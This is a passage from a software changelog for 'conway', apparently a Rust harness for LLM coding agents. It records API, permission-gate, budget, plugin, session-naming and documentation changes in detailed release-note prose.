  `appends` and `excludes` with no field pairing an append to a position,
  so a script cannot express "replace" even by combining the two.
  Excluding never discards — the pre-edit payload is reconstructable — and
  appends land after the cached prefix, so prompt caching is unaffected.

### Changed

- Decided: **`Backend::probe` stays.** Retiring the periodic health prober
  left it with no in-tree caller, but it remains a required method on the
  `Backend` port's public contract — documented for third-party
  implementors, exercised by two crates' test suites, and structurally
  unlike a declared-but-unreachable capability: it produces a real liveness
  result whenever anything calls it. `[models].probe_on_startup` drives a
  different mechanism entirely (`BackendFactory::probe_capabilities`) and
  never calls it.

### Added

- **`ConwayBuilder::with_prompt_handler`, closing a gap the builder's own
  doc had disclosed as unresolved.** `permissions.mode = "prompt"` — the
  config default, including `discover()`'s — previously had no
  builder-level way to satisfy it short of hand-implementing the whole
  `PermissionGate` trait. The new method hands a single closure to the
  `PromptingGate` that `gates::from_config` already builds. Precedence is
  explicit and tested: an injected `with_permission_gate` still wins
  unconditionally. Calling neither still fails `build()` with a named
  `ConwayError::Config` — never a silent fallback.
- **Four runnable `conway` examples, each with a companion smoke test:**
  `discover_getting_started` (the shortest path from `cargo add conway` to
  a model's answer), `custom_permission_gate` (a third-party
  `PermissionGate` genuinely consulted during a real tool call, proven with
  a recording gate rather than a successful build),
  `event_stream_consumer` (assembling a reply from `TextDelta`s off
  `SessionHandle::events()`), and `real_provider_inference` (the same
  shape against a genuine `OpenAiCompatBackend` — opt-in only, and its
  smoke test drives a loopback server, never a live endpoint).

### Changed

- **`docs/embedding.md` opens with the `discover()`-based screenful**
  instead of the facade's structural overview, and gains a "Discovery, not
  a struct literal" section explaining why `ConwayConfig` still has no
  `Default`: a `default_role` picked silently by a Rust `impl` would be an
  opinion the core has no business holding, and a `discover()`-based caller
  pays nothing for its absence.

### Changed

- **`Conway` sheds three responsibilities it never should have carried
  inline.** Permission-file I/O — reading, validating, installing and
  rewriting `permissions.json` — moves to a new `crate::permissions` module
  inside the facade, where its dependence on facade-only config discovery
  keeps it. `pull_in`/`promote`/`purge` move to
  `conway_runtime::runtime::Runtime`, beside `AgentTree`: they never needed
  anything but the tree snapshot and the session store, both of which
  `Runtime` already owned. Intent classification's mechanical
  spawn/drain/purge sequence becomes `Runtime::run_ephemeral_turn`, a
  mode-agnostic sibling of the existing `SubagentHost::ask` — which is
  Fork-only by trait contract and so cannot serve a classifier that
  deliberately spawns with a clean slate. **No public signature changed:**
  every `Conway` method these moves touch takes the same arguments, returns
  the same type, and every existing test in
  `crates/conway/tests/{promote,pull_in,purge,intent,permission_*_seam}.rs`
  passes unedited. `conway.rs` drops from 2,411 lines to 1,389 (48 methods
  to 38) because the code moved to where it belongs, not because anything
  was removed.

### Added

- **Anthropic gets its first built-in profile, and one procedure now covers
  adding a provider variant to either wire family.** `dialect: "kimi-code"`
  resolves out of the box for Kimi's coding plan with no
  `.conway/profiles.toml` required — before this, every `dialect` value for
  `"anthropic"` failed with `UnknownProfile`, since the kind shipped none.
  It sets neither `anthropic_version` nor `headers`: nothing in this
  repository is evidence that Kimi's gateway needs either overridden, so it
  ships zero overrides rather than a guess. `ANTHROPIC_BUILT_IN_PROFILES`
  in `crates/conway-plugin-backends/src/factory.rs` records which other
  endpoints were considered and why each was left out. `docs/providers.md`'s
  "Adding a provider variant" is now one procedure covering both
  `openai-compat` and `anthropic`, each with a worked example that is
  actually executed — `tests/providers_doc_walkthrough.rs` drives both
  through a real `BackendFactory::build` against `wiremock` and asserts the
  documented wire-body and header effects — replacing a walkthrough that
  only ever demonstrated `openai-compat`.

### Added

- **One-shot mode gains six flags: `--agent`, `--system-prompt` /
  `--append-system-prompt`, and `--max-turns` / `--max-tokens` /
  `--max-seconds`.** `-p` was a coding agent with the interactive parts
  removed — every flag it had assumed a repository and a tool-calling task.
  `--agent <name>` runs as a named `.conway/agents/<name>.md` definition;
  an unknown name is a usage error naming the directory searched, never a
  silent no-op. `--system-prompt <text>` replaces the effective system
  prompt outright — with `--agent` absent, this is what stops a one-shot
  run from being the built-in coding agent at all — and
  `--append-system-prompt <text>` adds to whatever is in effect instead of
  replacing it. The three budget flags expose the runtime's
  already-enforced turn/token/wall-clock budget to the command line instead
  of only `settings.json`. `--system-prompt`, `--append-system-prompt` and
  the budget flags are usage errors when combined with `--resume` /
  `--fork-from`, since neither facade path accepts a caller override yet —
  a stated refusal rather than a silent drop. `--agent` composes cleanly
  with `--fork-from`. `SessionSpec` and `RootSpec` gained a
  `system_prompt_override` field to carry the literal-text case through.
- **A plugin can add a subcommand to the `conway` binary, not only a slash
  command to the TUI.** Anything typed that is not a built-in subcommand is
  resolved against every installed plugin's declared commands, namespaced
  `<plugin-id>.<command-name>` — the same scheme and the same resolver the
  TUI's `/`-prefixed dispatch already uses, reused rather than
  reimplemented. Proven through the real shipped `conway-plugin-history`
  crate: `conway conway.history.rewind <seq>` forks the real session store
  end to end; without `[plugins].install` the command is simply unknown,
  with no special case anywhere in core.

### Changed

- **The runtime no longer links the JSONL adapter it never needed.**
  `TranscriptResolver` and `provenance::{append_context_report,
  load_context_report, load_all_context_reports}` moved from
  `conway-session` into `conway-core` — both were always pure logic over
  the `SessionStore` port, not over `JsonlSessionStore` specifically.
  `conway-runtime`'s manifest no longer names `conway-session`, so
  `cargo tree -p conway --no-default-features` no longer pulls it in: the
  `jsonl-store` feature now genuinely gates linkage rather than only
  default wiring. `conway-session` re-exports both unchanged, so existing
  callers and its own test suites compile and pass with no edits.

### Changed

- **One kind-agnostic profile facility, not a second per-kind store.**
  `openai-compat`'s declarative profile machinery is lifted to
  `conway_plugin_backends::profile_store::ProfileStore<T>` over a small
  `Profiled` trait, owning only what is not dialect-specific: file
  discovery layering, shadow-tracking, and one typed
  `ConfigError::UnknownProfile`. It never reads a field beyond `id`, so it
  structurally cannot become dialect-aware. `"anthropic"` gains real
  profile selection through the same mechanism — `[backends.<id>].dialect`,
  optional for this kind, names a reusable `.conway/profiles.toml` bundle
  of `anthropic_version`/`headers` — under one documented precedence rule
  shared by both kinds: an explicit `extra` key wins over a selected
  profile, and unset keys fall to the kind's own default. A structural test
  pins that exactly one profile-store type exists. `docs/providers.md`
  records the finding that one physical profile file cannot mix entries for
  both kinds, because each kind's parser validates every entry in a
  discovered file as its own shape — the price of the facility staying
  genuinely kind-agnostic.

### Changed

- **Presentation config left the embeddable schema.** `TuiSection`,
  `ThemeConfig`, `ThemeStyleConfig` and `StatusLineConfig` — roughly 34
  terminal-shaped configuration slots — moved from `conway::config::schema`
  to `conway-cli` (`crates/conway-cli/src/tui/config.rs`), the one reader
  that ever parses or renders them. A service or IDE linking only the
  `conway` facade no longer parses or validates a theme it can never draw.
  An existing `settings.json` with a `[tui]` block still drives the CLI
  identically — the CLI re-reads it through its own layered load and its
  own `deny_unknown_fields` schema, so a typo inside `[tui.theme]` is still
  a named parse error. A bare embedder calling `conway::config::load`
  directly on such a file gets a successful load plus a `ConfigWarning {
  code: PresentationConfigIgnored, .. }`, rather than either a hard failure
  or the block silently vanishing. `Conway::sweep_stale_modal_asks` no
  longer hardcodes its "4x the TUI's 15s heartbeat" freshness threshold: it
  takes `live_threshold: chrono::Duration` from the caller, and the CLI
  computes its own from its own local heartbeat constant.

### Added

- **`ToolCtx::for_test(agent_id, cwd, subagents, events)`: a `Tool::invoke`
  unit test no longer requires hand-assembling `ToolCtx`.** `ToolCtx.chdir`
  and `.subagents` are `CwdHandle`/`SubagentHandle` — concrete types
  `conway::plugin` has never exported — so a crate depending only on
  `conway` could not construct a `ToolCtx` by hand AT ALL, not merely
  verbosely: the attempt failed to compile (`could not find CwdHandle in
  plugin`). `ToolCtx::for_test` is a constructor on a type the facade
  already re-exports, so no new name joins `conway::plugin`'s curated
  surface — mirroring `ArtifactWriteHandle::noop`. Unlike that constructor
  it does NOT default `subagents`/`events` to silent no-ops: a
  `Tool::invoke` test usually wants to assert a subagent started or an
  event fired, so it takes `Arc<dyn SubagentHost>`/`Arc<dyn EventSink>` as
  required parameters — satisfied by `conway::testkit::{FakeSubagentHost,
  CollectingEventSink}` with neither type named at the call site. Proven by
  two scratch crates outside the workspace: the pre-fix attempt fails to
  compile, the post-fix one compiles and passes with 23 lines before the
  first assertion. `conway-tools`'s own `test_ctx` now delegates its field
  assembly to this constructor.

### Removed

- **`AgentMessage::Progress`** — a message kind, classifier arm, drain
  effect, and event-emission path existed end to end for a child to report
  mid-flight progress to its parent, but no production code path ever sent
  one; every construction site was in a test. The deciding fact was not the
  missing sender but where the message could go: a drained `Progress` never
  became a record or a context segment, so the orchestrating model would
  never have seen it even fully wired — only a human watching the parent's
  pane would, and a child's own session-scoped event stream already carries
  strictly more. Removed together: the `AgentMessage::Progress` and
  `MessageKind::Progress` variants, `mailbox::classify`'s arm producing
  `DrainEffect::Progress`, the `DrainEffect::Progress` variant itself, and
  `agent_loop.rs`'s `drain_inbox` arm that turned a drained `Progress` into
  an `Event::AgentProgress`. `Event::AgentProgress` itself is UNTOUCHED and
  remains live: `session_handle.rs`'s replay path and the CLI's TUI, JSON
  and JSONL renderers produce and consume it independently of this channel.
  This does not close the door on mid-flight progress — a model-visible
  version would be a new `ToolCtx` capability, not a revival of this one.

### Added

- **The `"anthropic"` backend kind reads its own `extra` configuration.**
  `[backends.<id>].anthropic_version` overrides the `anthropic-version`
  wire header (was hardcoded); `.headers` adds provider-specific headers
  (e.g. `anthropic-beta`) alongside the two `AnthropicBackend` always
  sends. Any other key under this kind's `extra` is now a rejected, named
  build error — previously it was captured and silently discarded, the gap
  `BackendBuildContext::extra`'s own doc already disclosed ("neither
  shipped kind reads it"). A config with no `extra` is unaffected: the
  default wire version is unchanged (`2023-06-01`). See
  [`docs/providers.md`](docs/providers.md#wire-version-and-header-overrides).

### Changed

- **`conway_fork`'s `await` schema description now says what its own
  fan-out claim depends on.** Sibling `conway_fork` calls only share a
  provider prefix cache if they are issued as separate tool calls within
  ONE reply — the property `PHILOSOPHY.md`'s "Working with the cache" and
  this crate's own cache test (`fanout_prefix_sharing.rs`) already
  establish. `await`'s description previously said only "`false` returns
  the agent_id immediately for fan-out" and never that spreading forks
  across separate replies forfeits the shared prefix entirely, even with
  `await: false` on every one of them. No behavior changed: this is a
  model-facing description fix — a declaration site was claiming less than
  the behaviour it described — for a property that was already true and
  already silent. `docs/agents.md` gains the same caveat, and a
  new negative-case test (`crates/conway/tests/fanout_prefix_sharing.rs`)
  proves the cross-turn case does NOT share what the same-turn case does,
  alongside the existing positive-case test. `conway_spawn`'s identical
  `await` wording is unchanged and does not need this caveat: a spawned
  child inherits no transcript at all, so nothing about it is
  turn-boundary-sensitive.

### Fixed

- **`conway sessions` and `conway routes` no longer require a permission
  handler.** Both are read-only inspections that never start an agent or
  propose a tool call, but dispatch supplied them no `PermissionGate`, so
  `ConwayBuilder::build` fell through to `gates::from_config` — which errors
  under `permissions.mode = "prompt"`, because no subcommand can supply the
  interactive handler that mode needs. `conway routes explain <role>` therefore
  refused to run under an ordinary interactive config, for want of a permission
  decision it could not have made. They now carry a deny-all gate, which is
  never consulted either way.

  Two test fixtures existed solely to work around this by rewriting
  `permissions.mode` to `"deny"`; both are gone, so those tests now run against
  a prompt-mode config and guard the fix.

### Removed

- **Repeated-step detection is no longer in the core.** `StepDigest` ran
  unconditionally in the agent loop and appended a `SystemNote` to the durable
  log on the third identical tool call, with no way to decline it. That
  contradicted `PHILOSOPHY.md` §6 in the page's own words — "repeated-step
  detection, retry ceilings, and circling-agent heuristics are not in the core
  … the policy is yours to write, including writing none" — which is not true
  while the core ships one. The whitepaper §4.5 names the same behavior
  specifically as belonging in a plugin.

  It now lives in `conway-plugin-stepguard`, installed by naming
  `conway.stepguard` in `plugins.install`. Behavior is unchanged when
  installed, with one improvement: sibling agents no longer pool their calls,
  so a fan-out where ten children each make the same call once is not reported
  as repetition.

- **`Event::RepeatedStep`** — the core event vocabulary keeps no variant that
  the core cannot produce, which is `Plugin::events`' own rule. The plugin
  fires `conway.stepguard.repeated_step` under its own namespace instead.

- The `lru` dependency of `conway-runtime`, which existed solely for
  `StepDigest`'s ring.

### Fixed

- **A dropped tool call is now part of the record instead of behind it.**
  When a transcript contains a tool call with no answering result — a fork
  taken mid-batch, or a session killed between an assistant turn and its
  results — conway removes the call so the request is one a provider will
  accept at all. It did that silently. `ContextReport` gains a `dropped` list
  naming every removed `call_id`, which reaches both the live report a caller
  reads and the durable `context_report` log record, and `/context` prints it.

  The harness does not curate context on its own initiative; the one place it
  must intervene to produce a sendable request is therefore visible. A turn
  where the model re-issues a call it appears never to have made is now
  explicable from the log rather than mysterious.

  `#[serde(default)]` on the new field, so every session written before it
  existed still decodes.

- **`Budget::max_tool_calls` is now enforced.** It was public, settable through
  `ForkSpec`/`SpawnSpec`, and serialized into the session log, but nothing ever
  read it: an embedder who set a tool-call ceiling got no ceiling and no
  warning. `AgentLoop::check_budget` now gates on it like the other three
  dimensions, and the terminal `BudgetExceeded` names which one tripped.

  The counter tracks calls **dispatched**, not outcomes returned — a batch
  cancelled part-way through still counts every call it started, because some
  of them have already run their side effects. It is turn-scoped and resets at
  the keep-alive user-turn boundary alongside `max_steps`, for the same reason:
  a tool-call ceiling is a runaway-loop guard, and reading it over a whole
  session's lifetime would permanently end an interactive session after N total
  calls rather than bounding each turn.

### Added

- **A `ToolObserver` port**, and `Plugin::observers` to supply one. An observer
  is handed each finished tool call — including the arguments, which the
  `post_tool_use` payload does not carry — and returns a description of what to
  record; the runtime performs it. It receives no `SessionStore`, no event bus
  and no agent handle, following the same declare-an-effect shape
  `ContextHook` and `CommandOutcome::ForkSession` already use, so a
  misbehaving observer's blast radius is bounded by the return type.

  Observation is fail-open and cannot alter what it observed: the call has
  already run, and a panicking observer is contained rather than failing the
  batch. An observer fires its own plugin-declared events through the same
  handle a plugin's tools already use, so it cannot emit a core event or
  impersonate another plugin.

  With no observing plugin installed the runtime's observer pass does not
  execute at all — which is the point rather than an optimization, since
  "write no policy" has to be a real option.

- **`crates/conway-plugin-stepguard`**, the first consumer of that port and
  the fourth first-party plugin. Not installed by default.

- **`limits.max_tool_calls` in `settings.json`**, and `max_tool_calls` on the
  `budget` argument of `conway_fork`/`conway_spawn`/`conway_ask` plus the
  matching `subagent.max_tool_calls`/`ask.max_tool_calls` plugin config keys.
  The other three budget dimensions each had a config counterpart; enforcing
  this one without adding its own would have left a capability reachable only
  from the library API. `0` means no ceiling, matching `max_tokens` and
  `deadline_secs`.
- **`docs/agents.md` documents budgets**, which no page previously covered —
  all four dimensions, which are turn-scoped and which are lifetime-scoped and
  why, the config block, and the fact that a child never inherits its parent's
  budget.

### Added

- **`conway-testkit`**, a new crate: test doubles for every `conway-core`
  port trait (`FakeBackend`, `ScriptedBackend`, `FakeStore`, `FakeGate`,
  `FakeRouter`, `FakeHealth`, `FakeSubagentHost`, `CollectingEventSink`),
  moved out of `conway-core`'s old `fakes.rs`. `conway` gains a new
  `testkit` feature (off by default) that forwards it, re-exported as
  `conway::testkit` when enabled — a crate depending only on `conway` can
  now reach `FakeSubagentHost`/`CollectingEventSink` and the rest, which it
  could not before: the old `fakes` feature lived on `conway-core` and
  `conway`'s facade enabled it only under `[dev-dependencies]`, so this
  workspace's own tests reached ready-made doubles a third party had to
  hand-implement `SubagentHost`/`EventSink` to get.

### Removed

- **`conway-core`'s `fakes` feature and `fakes.rs`.** Superseded by
  `conway-testkit`, above. `crates/conway-core/tests/fakes_conformance.rs`
  moved to `crates/conway-testkit/tests/fakes_conformance.rs` unchanged in
  substance.

### Added

- **`conway.trim` is wired into the shipped `conway` binary** — board item `01M0TV447NAJ1R06S455DZPP54`: `conway-cli` now depends on `conway-plugin-trim`, so naming `"conway.trim"` in `[plugins].install` resolves through the same first-party mechanism as every other id and its `Curator` actually runs, closing the gap where it was compiled, tested, and unreachable from the binary.

### Fixed

- **`/tree`'s own doc comment claimed its rendering "always matches what `/agents` shows"; it no longer does, since `01M0RWKJD04JBR5NCVKBQXYHV4` gave the `/agents` panel a screen-relative short id** — board item `01M0TNCAP1HH4YNC5K9753YG26`. Decided in favor of keeping `/tree` on full ids: a transcript line outlives the row set that made a short prefix unique, so it needs a durable reference, not a screen affordance. `commands.rs`, `docs/agents.md`, and `docs/interactive.md` now say so explicitly instead of claiming parity that doesn't hold.

### Changed

- **`conway-plugin-mcp` and `conway-plugin-subprocess` no longer hand-roll the same child-process session lifecycle twice** — board item `01M0TV7ZDS8X4F4TEJPRZB9P6T`. Spawn, the id-correlated NDJSON round trip, the per-call timeout, and fail-closed teardown (dead session / malformed frame / `Drop`-time SIGKILL) are now one implementation, `conway::plugin::ChildSession` (new, in `conway-tools::process::child_session`, reached through the facade the same way `kill_group`/`DEFAULT_TIMEOUT_MS` already are — board items `01M0EKVR1BEXXS75NV2JC4HZZ9` / `01M0TV6E2K6QF9VXP6C7TFH06X`). Each crate's own public error enum (`McpPluginError` / `SubprocessPluginError`) is unchanged — same variants, same `Display` text — via a new `conway::plugin::ChildSessionError` trait each implements as a one-line-per-variant mapping. Each wire dialect's own request shapes, version negotiation, and participant-vs-observer refuse/degrade rules stay local to their owning crate, untouched.

### Fixed

- **A `/ask` pull-in that failed part-way no longer leaves the parent holding a question with no answer** — board item `01M0TNBACHQSAMMJ3TY14S47MX`. `Runtime::pull_in` merges the ask by appending several records in a loop; `SessionStore` is append-only, with no multi-record append and no rollback, so an append that failed after the question had landed left it in the parent's durable log forever — visible in the transcript (its event had already fired) and, worse, assembled into the NEXT turn's context, showing the model a question nothing answered. Atomicity is not available at that port, so the fix is the repair an append-only log does admit: a truncated merge immediately appends a `LogRecord::SystemNote` (reason `pull_in_truncated`) naming the child that still holds the ask, and emits its live twin, so the log, the transcript, and the model's context all say the same coherent thing. The child is deliberately NOT purged on any failure path — its records are the only surviving copy of whatever did not merge.
- **`Conway::pull_in`'s error now says whether anything happened.** A failure that mutated nothing — the whole guard matrix, plus a merge whose very first append failed — is still a flat `FacadeError::Store`; a failure that had already written to the parent's log is the new `RuntimeError::PullInIncomplete`, carrying how many of how many records merged, whether the truncation note landed, and the underlying `StoreError`. This also covers the case a failing purge leaves behind: a merge that landed IN FULL and then could not delete the child used to return a bare `NotRemovable`, identical in shape to the pre-check guard that refuses before writing anything, so a caller that read it as "nothing happened" and retried would have merged the ask twice.
- **`FakeStore` can now be told to fail** — `fail_nth_append`, `fail_appends_from` (sticky), `fail_nth_remove`, and `clear_append_failure`. Counting starts when the knob is armed, so a test never has to know how many appends its own setup made, and a failed call records nothing. Without this seam the partial-merge behaviour above was untestable, which is why `crates/conway/tests/pull_in.rs`'s seven existing tests said nothing about it: five are guard refusals, and every one of them refuses before any mutation. The seam is covered by its own conformance tests in `crates/conway-testkit/tests/fakes_conformance.rs`.

### Added

- **Sessions can carry an operator-chosen name** — board item `01M0TV5CYSP844XR8PJ59D8QM4` (INTENT.md §7b: "a session an operator will return to can carry a name the operator chose"). New `conway sessions name <id-or-name> <name>` attaches a name or renames an existing one; `conway sessions unname <id-or-name>` removes it. `--session`/`--resume`/`--fork-from` and `sessions show|tree|export` now accept a name wherever they accepted a bare ULID. A name that itself parses as a valid ULID is refused at naming time, and a name already bound to a different session is refused too, naming which session holds it — never a silent guess or overwrite. `sessions list`'s table and `--json` output gain a `NAME` column/field, blank (never a synthesized placeholder) for an unnamed session. The name lives in a new sidecar file, `session-names.json`, beside the project's session store (`crates/conway-cli/src/session_names.rs`) — a side table keyed by session id, never a field on the session's own append-only log record, so naming or renaming a session never rewrites anything the log itself wrote.

### Fixed

- **`ARCHITECTURE.md` §2b, `PHILOSOPHY.md` §6, and `docs/plugins/README.md` had all drifted from the twelve plugin crates actually in the tree** — board item `01M0TV7GFSNNRZV522XCRMTHVX`: `ARCHITECTURE.md` §2b named nine of the twelve `conway-plugin-*` crates, silently omitting `conway-plugin-discover`, `conway-plugin-path`, and `conway-plugin-trim`; `PHILOSOPHY.md` §6's two "Where the tree is today" notes had the same gap; `docs/plugins/README.md` still said "Five shipped first-party plugins," missing `conway.trim` now that it is fully wired into the shipped binary (identical status to `conway.path`/`conway.discover`/`conway.memory`). All three now enumerate all twelve crates, with the plugin-*crates-that-exist* population kept distinct from the smaller *installable-id* roster `conway-cli`'s `first_party_plugins::bundle()` actually resolves. `docs/README.md` also gained a `docs/dogfooding.md` row — the page existed, linked from `GUIDE.md`, but was reachable from no index.

### Added

- **Agents can be given names, and every agent-targeted command accepts one** — board item `01M0TV5BSE98S16SFYECG9G9WP`, decision `01M0TV3ZZBDKSSV7MD0FW3FSY7`. A new first-party plugin, `conway.names`, contributes `/conway.names.rename`, `/conway.names.unname`, and `/conway.names.list`; a named agent shows its name in the `/agents` panel and answers to it from `/steer`, `/context`, and `/fork @<agent>`, because all of them already route through one resolver. Names persist across restarts in `agent-names.json` beside your `settings.json`, and a name sits **alongside** an agent's id — never instead of it. Documented in `docs/plugins/names.md`.
- **Naming ships with ZERO change to `conway-core`, which is the second half of the deliverable** — the `AgentNames` trait AND its filesystem implementation both live in `crates/conway-plugin-names`; `conway-cli` threads one `Arc` exactly the way it already threads `conway.memory`'s store. A core `AnnotationStore` port and a plugin-owned file the CLI reads were both weighed and rejected (the second is a shape this project already abandoned once — see `conway_core::ports::memory_store`'s own module doc). Opt-in like every other member of the first-party bundle: uninstalled, the `/agents` panel and the agent resolver behave exactly as they did before, and no file is created.

### Added

- **`/cancel <agent> [<reason>]`: the operator can now stop a runaway subagent without losing the parent session** — board item `01M0TV4Y1K9ESJQ4PDRCP7R3FA` (INTENT.md §7a: "anything a model can do to the session's agents, the operator can do from the terminal with one typed command"). The model already had `conway_cancel`; the operator's only lever was `/quit`, which ends the whole session and loses the parent's in-flight work along with it. `/cancel` targets any agent — focused or not — through the same three-pass `resolve_agent` `/steer` already uses (full id, exact name, unique prefix), and reaches the identical facade path the model's own tool reduces to (`SessionHandle::cancel` → `SubagentHost::cancel`, always `CancelMode::Immediate`; the operator surface exposes no `mode` argument — `Graceful` stays reachable only through the model-facing tool). Cancelling the session's own root agent is refused before any facade call — that would end the session, which this command's own acceptance forbids — with the refusal naming `/quit` as the way to actually end one. Termination is visible for free: the pre-existing `AgentFinished { Cancelled }` handling already flips the agent's `/agents`/`/tree` row to `Cancelled` and its transcript entry in place. `/await` parity did not ride along: `commands::execute` is awaited inline on the TUI's main loop (see `App::submit`), so an indefinite block on a runaway agent's terminal result would freeze the whole interactive session — reaching it without that freeze needs the same background-task machinery `/ask`'s modal flow required (`Effect::RunModalAsk` + `App::spawn_modal_ask`), which is not "cheap" once the targeting machinery exists; it is its own item. Documented in [`docs/interactive.md`](docs/interactive.md#slash-commands).

### Fixed

- **`sessions list`'s `ID` column, and `sessions tree`'s per-node label, no longer truncate to a fixed first 8 characters** — board item `01M0V03FQGJ8C375QJDD75YH41`. `fmt::id_short` performed no uniqueness computation against any set, so two sessions created within about a second of each other (a ULID's leading characters encode its millisecond timestamp) rendered the identical 8-character token in both surfaces — the opposite of what an `ID` column is for, and actively misleading now that `sessions list` also carries a `NAME` column an operator is meant to use to tell rows apart. Both now print the full id, matching `--json`'s `id`/`origin.parent` fields (already full) and TREE-ID's ruling (`01M0TNCAP1HH4YNC5K9753YG26`) that a durable, scriptable reference takes the full id, a screen-relative short id being a UI affordance for a different surface (the TUI agent panel) that does not apply here. `sessions list`'s `ORIGIN` cell keeps `fmt::id_short` deliberately — it names one already-known parent as annotation, not a token the operator is choosing among several visible rows, the same case the TUI panel's own `short_agent_id` carves out for its status line. `fmt::id_short`'s doc now states plainly that it computes no uniqueness; its existing test is kept (the truncation itself was never the defect) and paired with a new test demonstrating the collision it warns about.

### Changed

- **`crates/conway/src/config/schema.rs`'s `default_hook_timeout_ms` — the default behind `HookEntry::timeout_ms`, `SubprocessPluginEntry::timeout_ms`, and `McpPluginEntry::timeout_ms` — now returns `conway::plugin::DEFAULT_TIMEOUT_MS` instead of restating its own `5000` literal** — board item `01M0TX5EB6WDK6W4WKZJ29AD9F`, closing the same defect CON-1 (`01M0TV6E2K6QF9VXP6C7TFH06X`) fixed one layer up: a hook callout, a subprocess plugin call, and an MCP round trip are three shapes of the identical risk this crate already treats as one policy — every operator-configured local child process it spawns gets the same default grace period before being killed — and the file's doc comments used to assert the two numbers agreed with nothing checking that they did. No value changed (still 5000ms everywhere); the two are now structurally one number rather than a coincidence documented as a rule.

### Documented

- **`AgentResult::transcript_ref` keeps its name, and now carries the argument for why** — board item `01M0TX4TBJTPKN4ED50EEH2SY3`, the redesign question `01M0TV4J05PYE8PG6YTV0HX5HN` was forbidden from answering while it documented the trap in `docs/scripting.md` and `docs/sessions.md`. A `--output-format json` result leads with `agent_id`, but only `transcript_ref` is accepted by `--resume`/`--session`/`--fork-from`, so renaming the latter to `session_id` was weighed against keeping it. **Kept, with no `serde` alias and no rename**, on four grounds now recorded as a doc comment on the field itself rather than left to be re-opened: the name is load-bearing about *containment* (what crosses the trust boundary is a reference to a transcript, never a transcript — the claim `conway-runtime`'s `result_contract` suite pins), not about resuming; `AskOutcome`'s field and the `AgentResult` embedded in a `ChildResult` record are the identical noun for the identical reason, so renaming one splits it and renaming all of them spends the whole subagent and plugin surface; the `serde` name is **persisted**, not merely printed, so a bare rename makes every already-written `<session-id>.jsonl` fail to deserialize while an alias repairs only that direction and does nothing for the `jq -r .transcript_ref` that would start returning `null` silently; and since session names landed those three flags take `<session-id-or-name>[@<seq>]`, so `session_id` is a *less* exact name for "what you pass to `--resume`" than the rename assumed. This diverges from CON-3, which skipped a deprecated alias when renaming `ConwayError` to `FacadeError`, only because that rename's compatibility surface really was compile-time-only under `publish = false`; a field name sitting in the operator's existing log files is not. No behaviour, wire format, or public name changes.

### Fixed

- **`docs/plugins/README.md`'s "shipped first-party plugins" section named six ids that were not a subset of what it actually ships, and stated no rule for which ids belonged** — board item `01M0TYB3JDFYE0KJTGHW995B7X`. `first_party_plugins::bundle()` resolves nine `Plugin` candidates, not the page's six: `conway.history`, `conway.stepguard`, and `conway.plugin_skeleton` were unmentioned, and `conway.names` (landed after the page's last update) was too, while the MCP client — first-party, but attached through `[plugins].mcp`, never through `bundle()` — was listed alongside them as if it were one more `[plugins].install` id. The section now states its rule up front (every `bundle()` candidate gets a bullet, page or no page, cited against the function itself so the next drift is `grep`-checkable rather than memorized), gives `conway.history`/`conway.stepguard` the same page-less bullet shape `conway.trim` already used, marks `conway.plugin_skeleton` explicitly non-operator-facing rather than omitting it, adds a `names.md` row/bullet, and moves MCP to its own section with the config-surface distinction stated rather than implied. `ARCHITECTURE.md` §2b and `PHILOSOPHY.md` §6 gain the `conway-plugin-names` crate the prior drift-fix (board item `01M0TV7GFSNNRZV522XCRMTHVX`) predated, bringing both back to all thirteen `conway-plugin-*` crates.

### Fixed

- **`docs/vision/README.md` omitted four of the eight pages in its own directory, and one of the four carried a claim already falsified elsewhere in the tree** — board item `01M0TWSEH12002BGVG6G25XFB5`, filed after `01M0TV5PN8RR9NN97AWP09E6K7` (EMB-1) found a 397-line bindings survey a review had reported as absent, because it was linked from nothing. `docs/vision/README.md` now indexes `CATALOGUE.md`, `DESIGN-context-path.md`, `DESIGN-bindings.md`, and `BINDINGS.md` in a second table, with the convention stated: every page added to the directory gets a row in the same change. `CATALOGUE.md:46`'s "designed (not yet built) path layer" is corrected to name `conway.path`'s `compose_context_path`, which shipped in `c1a69de` — the same fact three `.rs` doc comments and `DESIGN-context-path.md` §11.7 were already corrected for (board item `01M0PEFMG96SVBBD5D2E06H34A`), a correction that could not reach this page because nothing indexed it.

### Added

- **`scripts/check-orphan-docs.py`, a new fast gate** (registered in `scripts/check-fast-gates.sh`, not yet wired into a `.github/workflows/ci.yml` job — see that script's own header): every tracked `.md` file must either have a link row in `docs/vision/README.md` (if it lives directly in that directory) or be referenced by path or filename from some other tracked `.md` or source file, with an explicit allowlist for prompt fragments and test fixtures that are loaded as data. Run against the tree before the fix above, it named exactly the four pages that fix adds.

### Documented

- **`conway.trim`'s 8-turn keep window gets no `settings.json` knob — considered and declined, argued rather than assumed.** Naming `"conway.trim"` in `[plugins].install` was already reachable; the window that curator drops old tool round-trips against was reachable only by an embedder calling `TrimPlugin::with_keep_turns` in Rust, leaving a binary-only operator with a number someone else picked and no way to change it. Argued and kept a plain constant, not turned into a config surface: it is a curation heuristic an operator has no feedback loop to evaluate, not a policy with a right answer to state, and `conway.memory`'s own `MemoryConfig` — the closest first-party precedent, the same shape of numeric injection budget — is *also* constructed with `Default::default()` in `conway-cli`'s bundling code today, with no `settings.json` field reaching it either; there is no existing "thread a `settings.json` scalar into a first-party plugin's config" pattern to follow, only a shrink-only per-agent narrowing mechanism built for a different problem. `DEFAULT_KEEP_TURNS`'s own doc comment now says plainly that 8 was picked, not measured — the crate's introducing commit already called it "arbitrary" the day it was written, and no benchmark has compared it against another number since. `crates/conway-plugin-trim/src/lib.rs` and `docs/plugins/README.md`'s `conway.trim` bullet carry the argument; no code, config schema, or test changed.

### Added

